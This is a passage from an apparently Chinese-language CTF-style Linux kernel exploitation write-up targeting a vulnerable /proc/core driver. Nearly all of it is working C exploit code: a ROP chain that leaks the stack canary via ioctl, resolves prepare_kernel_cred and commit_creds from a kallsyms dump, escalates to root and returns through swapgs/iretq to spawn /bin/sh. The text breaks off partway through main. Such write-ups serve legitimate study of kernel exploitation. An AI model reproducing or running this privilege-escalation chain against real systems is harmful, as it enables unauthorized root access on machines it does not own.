<div class="sourceCode" id="cb37"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> build_rop<span class="op">(</span><span class="dt">unsigned</span> <span class="dt">long</span> <span class="dt">long</span> canary<span class="op">)</span></span>
<span id="cb37-2"><a href="#cb37-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb37-3"><a href="#cb37-3" aria-hidden="true" tabindex="-1"></a>    <span class="dt">unsigned</span> <span class="dt">long</span> <span class="dt">long</span> commit_cred_offset <span class="op">=</span> <span class="bn">0x9c8e0</span><span class="op">;</span> <span class="co">// 0xffffffffa409c8e0-0xffffffffa4000000=0x9c8e0 get from kallsyms</span></span>
<span id="cb37-4"><a href="#cb37-4" aria-hidden="true" tabindex="-1"></a>    <span class="dt">unsigned</span> <span class="dt">long</span> <span class="dt">long</span> kernel_base_addr <span class="op">=</span> commit_cred_addr <span class="op">-</span> commit_cred_offset<span class="op">;</span></span>
<span id="cb37-5"><a href="#cb37-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb37-6"><a href="#cb37-6" aria-hidden="true" tabindex="-1"></a><span class="pp">#define vmlinux_offset(x) (x - 0xffffffff81000000)</span></span>
<span id="cb37-7"><a href="#cb37-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb37-8"><a href="#cb37-8" aria-hidden="true" tabindex="-1"></a>    memset<span class="op">(</span>name_payload<span class="op">,</span><span class="bn">0x90</span><span class="op">,</span><span class="kw">sizeof</span><span class="op">(</span>name_payload<span class="op">));</span></span>
<span id="cb37-9"><a href="#cb37-9" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">8</span><span class="op">]</span> <span class="op">=</span> canary<span class="op">;</span></span>
<span id="cb37-10"><a href="#cb37-10" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">10</span><span class="op">]</span> <span class="op">=</span> kernel_base_addr <span class="op">+</span> vmlinux_offset<span class="op">(</span><span class="bn">0xffffffff81000b2f</span><span class="op">);</span> <span class="co">// 0xffffffff81000b2f : pop rdi ; ret</span></span>
<span id="cb37-11"><a href="#cb37-11" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">11</span><span class="op">]</span> <span class="op">=</span> <span class="dv">0</span><span class="op">;</span><span class="co">//rdi=0 after pop rid</span></span>
<span id="cb37-12"><a href="#cb37-12" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">12</span><span class="op">]</span> <span class="op">=</span> prepare_kernel_cred_addr<span class="op">;</span><span class="co">//ret will triger to excute this function</span></span>
<span id="cb37-13"><a href="#cb37-13" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">13</span><span class="op">]</span> <span class="op">=</span> kernel_base_addr <span class="op">+</span> vmlinux_offset<span class="op">(</span><span class="bn">0xffffffff810a0f49</span><span class="op">);</span><span class="co">//ret-addr of prepare_kernel_cred_addr,0xffffffff810a0f49 : pop rdx ; ret;</span></span>
<span id="cb37-14"><a href="#cb37-14" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">14</span><span class="op">]</span> <span class="op">=</span> commit_cred_addr<span class="op">;</span><span class="co">//we put commit_cred_addr into rdx, after move rdi,rax, then call rdx or jmp rdx</span></span>
<span id="cb37-15"><a href="#cb37-15" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">15</span><span class="op">]</span> <span class="op">=</span> kernel_base_addr <span class="op">+</span> vmlinux_offset<span class="op">(</span><span class="bn">0xffffffff81735dc1</span><span class="op">);</span><span class="co">//0xffffffff81735dc1 : pop r15 ; mov rdi, rax ; jmp rdx</span></span>
<span id="cb37-16"><a href="#cb37-16" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">16</span><span class="op">]</span> <span class="op">=</span> <span class="bn">0x90</span><span class="op">;</span><span class="co">//this is for pop r15, we don&#39;t care</span></span>
<span id="cb37-17"><a href="#cb37-17" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">17</span><span class="op">]</span> <span class="op">=</span> kernel_base_addr <span class="op">+</span> vmlinux_offset<span class="op">(</span><span class="bn">0xffffffff81a012da</span><span class="op">);</span><span class="co">//return from commit_cred_addr, we are in root state: 0xffffffff81a012da : swapgs ; popfq ; ret</span></span>
<span id="cb37-18"><a href="#cb37-18" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">18</span><span class="op">]</span> <span class="op">=</span> <span class="bn">0x90</span><span class="op">;</span><span class="co">//this is for popfq, we don&#39;t care</span></span>
<span id="cb37-19"><a href="#cb37-19" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">19</span><span class="op">]</span> <span class="op">=</span> kernel_base_addr <span class="op">+</span> vmlinux_offset<span class="op">(</span><span class="bn">0xffffffff81050ac2</span><span class="op">);</span><span class="co">//0xffffffff81050ac2: iretq; ret;</span></span>
<span id="cb37-20"><a href="#cb37-20" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">20</span><span class="op">]</span> <span class="op">=</span> <span class="op">&amp;</span>get_shell<span class="op">;</span><span class="co">//return_addr rip for iretq</span></span>
<span id="cb37-21"><a href="#cb37-21" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">21</span><span class="op">]</span> <span class="op">=</span> user_cs<span class="op">;</span> <span class="co">//code seg for iretq</span></span>
<span id="cb37-22"><a href="#cb37-22" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">22</span><span class="op">]</span> <span class="op">=</span> user_flag<span class="op">;</span><span class="co">//flag register for iretq</span></span>
<span id="cb37-23"><a href="#cb37-23" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">23</span><span class="op">]</span> <span class="op">=</span> user_rsp<span class="op">;</span><span class="co">//rsp  for iretq</span></span>
<span id="cb37-24"><a href="#cb37-24" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">24</span><span class="op">]</span> <span class="op">=</span> user_ss<span class="op">;</span><span class="co">//stack seg for iretq</span></span>
<span id="cb37-25"><a href="#cb37-25" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>获得cs、ss，flag和rsp的脚本如下：</p>
<div class="sourceCode" id="cb38"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb38-1"><a href="#cb38-1" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> save_status<span class="op">()</span></span>
<span id="cb38-2"><a href="#cb38-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb38-3"><a href="#cb38-3" aria-hidden="true" tabindex="-1"></a>    <span class="co">// pushf--&gt;push flag into stack</span></span>
<span id="cb38-4"><a href="#cb38-4" aria-hidden="true" tabindex="-1"></a>    <span class="co">// then use pop user_flag to get current flag</span></span>
<span id="cb38-5"><a href="#cb38-5" aria-hidden="true" tabindex="-1"></a>    asm<span class="op">(</span><span class="st">&quot;mov %%cs,%0&quot;</span><span class="op">:</span><span class="st">&quot;=r&quot;</span><span class="op">(</span>user_cs<span class="op">));</span></span>
<span id="cb38-6"><a href="#cb38-6" aria-hidden="true" tabindex="-1"></a>    asm<span class="op">(</span><span class="st">&quot;mov %%ss,%0&quot;</span><span class="op">:</span><span class="st">&quot;=r&quot;</span><span class="op">(</span>user_ss<span class="op">));</span></span>
<span id="cb38-7"><a href="#cb38-7" aria-hidden="true" tabindex="-1"></a>    asm<span class="op">(</span><span class="st">&quot;mov %%rsp,%0&quot;</span><span class="op">:</span><span class="st">&quot;=r&quot;</span><span class="op">(</span>user_rsp<span class="op">));</span></span>
<span id="cb38-8"><a href="#cb38-8" aria-hidden="true" tabindex="-1"></a>    asm<span class="op">(</span><span class="st">&quot;pushf</span><span class="sc">\n</span><span class="st">&quot;</span></span>
<span id="cb38-9"><a href="#cb38-9" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;pop %0&quot;</span></span>
<span id="cb38-10"><a href="#cb38-10" aria-hidden="true" tabindex="-1"></a>        <span class="op">:</span><span class="st">&quot;=r&quot;</span><span class="op">(</span>user_flag<span class="op">)</span>    </span>
<span id="cb38-11"><a href="#cb38-11" aria-hidden="true" tabindex="-1"></a>    <span class="op">);</span></span>
<span id="cb38-12"><a href="#cb38-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb38-13"><a href="#cb38-13" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;user_cs:0x%016llx</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> user_cs<span class="op">);</span></span>
<span id="cb38-14"><a href="#cb38-14" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;user_ss:0x%016llx</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> user_ss<span class="op">);</span></span>
<span id="cb38-15"><a href="#cb38-15" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;user_rsp:0x%016llx</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> user_rsp<span class="op">);</span></span>
<span id="cb38-16"><a href="#cb38-16" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;user_flag:0x%016llx</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> user_flag<span class="op">);</span></span>
<span id="cb38-17"><a href="#cb38-17" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<h3 id="执行结果">4.3.执行结果</h3>
<p>完整的pop如下：</p>
<div class="sourceCode" id="cb39"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb39-1"><a href="#cb39-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
<span id="cb39-2"><a href="#cb39-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
<span id="cb39-3"><a href="#cb39-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;fcntl.h&gt;</span></span>
<span id="cb39-4"><a href="#cb39-4" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></span>
<span id="cb39-5"><a href="#cb39-5" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;unistd.h&gt;</span></span>
<span id="cb39-6"><a href="#cb39-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb39-7"><a href="#cb39-7" aria-hidden="true" tabindex="-1"></a><span class="dt">unsigned</span> <span class="dt">long</span> <span class="dt">long</span> commit_cred_addr<span class="op">;</span></span>
<span id="cb39-8"><a href="#cb39-8" aria-hidden="true" tabindex="-1"></a><span class="dt">unsigned</span> <span class="dt">long</span> <span class="dt">long</span> prepare_kernel_cred_addr<span class="op">;</span></span>
<span id="cb39-9"><a href="#cb39-9" aria-hidden="true" tabindex="-1"></a><span class="dt">unsigned</span> <span class="dt">long</span> <span class="dt">long</span> ret_addr<span class="op">;</span></span>
<span id="cb39-10"><a href="#cb39-10" aria-hidden="true" tabindex="-1"></a><span class="dt">unsigned</span> <span class="dt">long</span> <span class="dt">long</span> user_cs<span class="op">,</span> user_ss<span class="op">,</span> user_rsp<span class="op">,</span> user_flag<span class="op">;</span></span>
<span id="cb39-11"><a href="#cb39-11" aria-hidden="true" tabindex="-1"></a><span class="dt">unsigned</span> <span class="dt">long</span> <span class="dt">long</span> name_payload<span class="op">[</span><span class="dv">25</span><span class="op">];</span></span>
<span id="cb39-12"><a href="#cb39-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb39-13"><a href="#cb39-13" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> get_shell<span class="op">()</span></span>
<span id="cb39-14"><a href="#cb39-14" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb39-15"><a href="#cb39-15" aria-hidden="true" tabindex="-1"></a>    system<span class="op">(</span><span class="st">&quot;/bin/sh&quot;</span><span class="op">);</span></span>
<span id="cb39-16"><a href="#cb39-16" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb39-17"><a href="#cb39-17" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> build_rop<span class="op">(</span><span class="dt">unsigned</span> <span class="dt">long</span> <span class="dt">long</span> canary<span class="op">)</span></span>
<span id="cb39-18"><a href="#cb39-18" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb39-19"><a href="#cb39-19" aria-hidden="true" tabindex="-1"></a>    <span class="dt">unsigned</span> <span class="dt">long</span> <span class="dt">long</span> commit_cred_offset <span class="op">=</span> <span class="bn">0x9c8e0</span><span class="op">;</span> <span class="co">// 0xffffffffa409c8e0-0xffffffffa4000000=0x9c8e0 get from kallsyms</span></span>
<span id="cb39-20"><a href="#cb39-20" aria-hidden="true" tabindex="-1"></a>    <span class="dt">unsigned</span> <span class="dt">long</span> <span class="dt">long</span> kernel_base_addr <span class="op">=</span> commit_cred_addr <span class="op">-</span> commit_cred_offset<span class="op">;</span></span>
<span id="cb39-21"><a href="#cb39-21" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb39-22"><a href="#cb39-22" aria-hidden="true" tabindex="-1"></a><span class="pp">#define vmlinux_offset(x) (x - 0xffffffff81000000)</span></span>
<span id="cb39-23"><a href="#cb39-23" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb39-24"><a href="#cb39-24" aria-hidden="true" tabindex="-1"></a>    memset<span class="op">(</span>name_payload<span class="op">,</span><span class="bn">0x90</span><span class="op">,</span><span class="kw">sizeof</span><span class="op">(</span>name_payload<span class="op">));</span></span>
<span id="cb39-25"><a href="#cb39-25" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">8</span><span class="op">]</span> <span class="op">=</span> canary<span class="op">;</span></span>
<span id="cb39-26"><a href="#cb39-26" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">10</span><span class="op">]</span> <span class="op">=</span> kernel_base_addr <span class="op">+</span> vmlinux_offset<span class="op">(</span><span class="bn">0xffffffff81000b2f</span><span class="op">);</span> <span class="co">// 0xffffffff81000b2f : pop rdi ; ret</span></span>
<span id="cb39-27"><a href="#cb39-27" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">11</span><span class="op">]</span> <span class="op">=</span> <span class="dv">0</span><span class="op">;</span><span class="co">//rdi=0 after pop rid</span></span>
<span id="cb39-28"><a href="#cb39-28" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">12</span><span class="op">]</span> <span class="op">=</span> prepare_kernel_cred_addr<span class="op">;</span><span class="co">//ret will triger to excute this function</span></span>
<span id="cb39-29"><a href="#cb39-29" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">13</span><span class="op">]</span> <span class="op">=</span> kernel_base_addr <span class="op">+</span> vmlinux_offset<span class="op">(</span><span class="bn">0xffffffff810a0f49</span><span class="op">);</span><span class="co">//ret-addr of prepare_kernel_cred_addr,0xffffffff810a0f49 : pop rdx ; ret;</span></span>
<span id="cb39-30"><a href="#cb39-30" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">14</span><span class="op">]</span> <span class="op">=</span> commit_cred_addr<span class="op">;</span><span class="co">//we put commit_cred_addr into rdx, after move rdi,rax, then call rdx or jmp rdx</span></span>
<span id="cb39-31"><a href="#cb39-31" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">15</span><span class="op">]</span> <span class="op">=</span> kernel_base_addr <span class="op">+</span> vmlinux_offset<span class="op">(</span><span class="bn">0xffffffff81735dc1</span><span class="op">);</span><span class="co">//0xffffffff81735dc1 : pop r15 ; mov rdi, rax ; jmp rdx</span></span>
<span id="cb39-32"><a href="#cb39-32" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">16</span><span class="op">]</span> <span class="op">=</span> <span class="bn">0x90</span><span class="op">;</span><span class="co">//this is for pop r15, we don&#39;t care</span></span>
<span id="cb39-33"><a href="#cb39-33" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">17</span><span class="op">]</span> <span class="op">=</span> kernel_base_addr <span class="op">+</span> vmlinux_offset<span class="op">(</span><span class="bn">0xffffffff81a012da</span><span class="op">);</span><span class="co">//return from commit_cred_addr, we are in root state: 0xffffffff81a012da : swapgs ; popfq ; ret</span></span>
<span id="cb39-34"><a href="#cb39-34" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">18</span><span class="op">]</span> <span class="op">=</span> <span class="bn">0x90</span><span class="op">;</span><span class="co">//this is for popfq, we don&#39;t care</span></span>
<span id="cb39-35"><a href="#cb39-35" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">19</span><span class="op">]</span> <span class="op">=</span> kernel_base_addr <span class="op">+</span> vmlinux_offset<span class="op">(</span><span class="bn">0xffffffff81050ac2</span><span class="op">);</span><span class="co">//0xffffffff81050ac2: iretq; ret;</span></span>
<span id="cb39-36"><a href="#cb39-36" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">20</span><span class="op">]</span> <span class="op">=</span> <span class="op">&amp;</span>get_shell<span class="op">;</span><span class="co">//return_addr rip for iretq</span></span>
<span id="cb39-37"><a href="#cb39-37" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">21</span><span class="op">]</span> <span class="op">=</span> user_cs<span class="op">;</span> <span class="co">//code seg for iretq</span></span>
<span id="cb39-38"><a href="#cb39-38" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">22</span><span class="op">]</span> <span class="op">=</span> user_flag<span class="op">;</span><span class="co">//flag register for iretq</span></span>
<span id="cb39-39"><a href="#cb39-39" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">23</span><span class="op">]</span> <span class="op">=</span> user_rsp<span class="op">;</span><span class="co">//rsp  for iretq</span></span>
<span id="cb39-40"><a href="#cb39-40" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">24</span><span class="op">]</span> <span class="op">=</span> user_ss<span class="op">;</span><span class="co">//stack seg for iretq</span></span>
<span id="cb39-41"><a href="#cb39-41" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb39-42"><a href="#cb39-42" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb39-43"><a href="#cb39-43" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> save_status<span class="op">()</span></span>
<span id="cb39-44"><a href="#cb39-44" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb39-45"><a href="#cb39-45" aria-hidden="true" tabindex="-1"></a>    <span class="co">// pushf--&gt;push flag into stack</span></span>
<span id="cb39-46"><a href="#cb39-46" aria-hidden="true" tabindex="-1"></a>    <span class="co">// then use pop user_flag to get current flag</span></span>
<span id="cb39-47"><a href="#cb39-47" aria-hidden="true" tabindex="-1"></a>    asm<span class="op">(</span><span class="st">&quot;mov %%cs,%0&quot;</span><span class="op">:</span><span class="st">&quot;=r&quot;</span><span class="op">(</span>user_cs<span class="op">));</span></span>
<span id="cb39-48"><a href="#cb39-48" aria-hidden="true" tabindex="-1"></a>    asm<span class="op">(</span><span class="st">&quot;mov %%ss,%0&quot;</span><span class="op">:</span><span class="st">&quot;=r&quot;</span><span class="op">(</span>user_ss<span class="op">));</span></span>
<span id="cb39-49"><a href="#cb39-49" aria-hidden="true" tabindex="-1"></a>    asm<span class="op">(</span><span class="st">&quot;mov %%rsp,%0&quot;</span><span class="op">:</span><span class="st">&quot;=r&quot;</span><span class="op">(</span>user_rsp<span class="op">));</span></span>
<span id="cb39-50"><a href="#cb39-50" aria-hidden="true" tabindex="-1"></a>    asm<span class="op">(</span><span class="st">&quot;pushf</span><span class="sc">\n</span><span class="st">&quot;</span></span>
<span id="cb39-51"><a href="#cb39-51" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;pop %0&quot;</span></span>
<span id="cb39-52"><a href="#cb39-52" aria-hidden="true" tabindex="-1"></a>        <span class="op">:</span><span class="st">&quot;=r&quot;</span><span class="op">(</span>user_flag<span class="op">)</span>    </span>
<span id="cb39-53"><a href="#cb39-53" aria-hidden="true" tabindex="-1"></a>    <span class="op">);</span></span>
<span id="cb39-54"><a href="#cb39-54" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb39-55"><a href="#cb39-55" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;user_cs:0x%016llx</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> user_cs<span class="op">);</span></span>
<span id="cb39-56"><a href="#cb39-56" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;user_ss:0x%016llx</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> user_ss<span class="op">);</span></span>
<span id="cb39-57"><a href="#cb39-57" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;user_rsp:0x%016llx</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> user_rsp<span class="op">);</span></span>
<span id="cb39-58"><a href="#cb39-58" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;user_flag:0x%016llx</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> user_flag<span class="op">);</span></span>
<span id="cb39-59"><a href="#cb39-59" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb39-60"><a href="#cb39-60" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb39-61"><a href="#cb39-61" aria-hidden="true" tabindex="-1"></a><span class="dt">unsigned</span> <span class="dt">long</span> <span class="dt">long</span> get_kernel_func_addr<span class="op">(</span><span class="dt">char</span> <span class="op">*</span>cmd<span class="op">)</span></span>
<span id="cb39-62"><a href="#cb39-62" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb39-63"><a href="#cb39-63" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> buf<span class="op">[</span><span class="dv">64</span><span class="op">];</span></span>
<span id="cb39-64"><a href="#cb39-64" aria-hidden="true" tabindex="-1"></a>    memset<span class="op">(</span>buf<span class="op">,</span> <span class="dv">0</span><span class="op">,</span> <span class="kw">sizeof</span><span class="op">(</span>buf<span class="op">));</span></span>
<span id="cb39-65"><a href="#cb39-65" aria-hidden="true" tabindex="-1"></a>    <span class="dt">FILE</span> <span class="op">*</span>fp <span class="op">=</span> popen<span class="op">(</span>cmd<span class="op">,</span> <span class="st">&quot;r&quot;</span><span class="op">);</span></span>
<span id="cb39-66"><a href="#cb39-66" aria-hidden="true" tabindex="-1"></a>    fgets<span class="op">(</span>buf<span class="op">,</span> <span class="kw">sizeof</span><span class="op">(</span>buf<span class="op">),</span> fp<span class="op">);</span></span>
<span id="cb39-67"><a href="#cb39-67" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> strtoul<span class="op">(</span>buf<span class="op">,</span> NULL<span class="op">,</span> <span class="dv">16</span><span class="op">);</span></span>
<span id="cb39-68"><a href="#cb39-68" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb39-69"><a href="#cb39-69" aria-hidden="true" tabindex="-1"></a><span class="dt">unsigned</span> <span class="dt">long</span> <span class="dt">long</span> get_commit_cred_addr<span class="op">()</span></span>
<span id="cb39-70"><a href="#cb39-70" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb39-71"><a href="#cb39-71" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> <span class="op">*</span>cmd <span class="op">=</span> <span class="st">&quot;cat /tmp/kallsyms |grep commit_cred|awk &#39;{print $1}&#39;&quot;</span><span class="op">;</span></span>
<span id="cb39-72"><a href="#cb39-72" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> get_kernel_func_addr<span class="op">(</span>cmd<span class="op">);</span></span>
<span id="cb39-73"><a href="#cb39-73" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb39-74"><a href="#cb39-74" aria-hidden="true" tabindex="-1"></a><span class="dt">unsigned</span> <span class="dt">long</span> <span class="dt">long</span> get_prepare_kernel_cred_addr<span class="op">()</span></span>
<span id="cb39-75"><a href="#cb39-75" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb39-76"><a href="#cb39-76" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> <span class="op">*</span>cmd <span class="op">=</span> <span class="st">&quot;cat /tmp/kallsyms |grep prepare_kernel_cred|awk &#39;{print $1}&#39;&quot;</span><span class="op">;</span></span>
<span id="cb39-77"><a href="#cb39-77" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> get_kernel_func_addr<span class="op">(</span>cmd<span class="op">);</span></span>
<span id="cb39-78"><a href="#cb39-78" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb39-79"><a href="#cb39-79" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb39-80"><a href="#cb39-80" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">(</span><span class="dt">int</span> argc<span class="op">,</span> <span class="dt">char</span> <span class="op">**</span>argv<span class="op">)</span></span>
<span id="cb39-81"><a href="#cb39-81" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb39-82"><a href="#cb39-82" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> fd <span class="op">=</span> open<span class="op">(</span><span class="st">&quot;/proc/core&quot;</span><span class="op">,</span> O_RDWR<span class="op">);</span></span>
<span id="cb39-83"><a href="#cb39-83" aria-hidden="true" tabindex="-1"></a>    <span class="dt">unsigned</span> <span class="dt">long</span> <span class="dt">long</span> buf<span class="op">[</span><span class="dv">64</span><span class="op">];</span></span>
<span id="cb39-84"><a href="#cb39-84" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb39-85"><a href="#cb39-85" aria-hidden="true" tabindex="-1"></a>    <span class="dt">unsigned</span> <span class="dt">int</span> off_set_cmd <span class="op">=</span> <span class="bn">0x6677889C</span><span class="op">;</span></span>
<span id="cb39-86"><a href="#cb39-86" aria-hidden="true" tabindex="-1"></a>    <span class="dt">unsigned</span> <span class="dt">int</span> read_cmd <span class="op">=</span> <span class="bn">0x6677889B</span><span class="op">;</span></span>
<span id="cb39-87"><a href="#cb39-87" aria-hidden="true" tabindex="-1"></a>    <span class="dt">unsigned</span> <span class="dt">int</span> core_copy_func_cmd <span class="op">=</span> <span class="bn">0x6677889A</span><span class="op">;</span></span>
<span id="cb39-88"><a href="#cb39-88" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb39-89"><a href="#cb39-89" aria-hidden="true" tabindex="-1"></a>    <span class="co">// first setting off = 64</span></span>
<span id="cb39-90"><a href="#cb39-90" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> off <span class="op">=</span> <span class="dv">64</span><span class="op">;</span></span>
<span id="cb39-91"><a href="#cb39-91" aria-hidden="true" tabindex="-1"></a>    ioctl<span class="op">(</span>fd<span class="op">,</span> off_set_cmd<span class="op">,</span> <span class="dv">64</span><span class="op">);</span></span>
<span id="cb39-92"><a href="#cb39-92" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb39-93"><a href="#cb39-93" aria-hidden="true" tabindex="-1"></a>    <span class="co">// call read to leak canary</span></span>
<span id="cb39-94"><a href="#cb39-94" aria-hidden="true" tabindex="-1"></a>    ioctl<span class="op">(</span>fd<span class="op">,</span> read_cmd<span class="op">,</span> buf<span class="op">);</span></span>
<span id="cb39-95"><a href="#cb39-95" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb39-96"><a href="#cb39-96" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> <span class="op">(</span><span class="dt">int</span> i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> <span class="dv">64</span><span class="op">;</span> i<span class="op">++)</span></span>
<span id="cb39-97"><a href="#cb39-97" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
<span id="cb39-98"><a href="#cb39-98" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;%016llx &quot;</span><span class="op">,</span> buf<span class="op">[</span>i<span class="op">]);</span></span>
<span id="cb39-99"><a href="#cb39-99" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb39-100"><a href="#cb39-100" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
<span id="cb39-101"><a href="#cb39-101" aria-hidden="true" tabindex="-1"></a>    <span class="dt">unsigned</span> <span class="dt">long</span> <span class="dt">long</span> canary <span class="op">=</span> buf<span class="op">[</span><span class="dv">0</span><span class="op">];</span></span>
<span id="cb39-102"><a href="#cb39-102" aria-hidden="true" tabindex="-1"></a>    ret_addr <span class="op">=</span> buf<span class="op">[</span><span class="dv">2</span><span class="op">];</span></span>
<span id="cb39-103"><a href="#cb39-103" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;get canay is:%016llx</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> canary<span class="op">);</span></span>
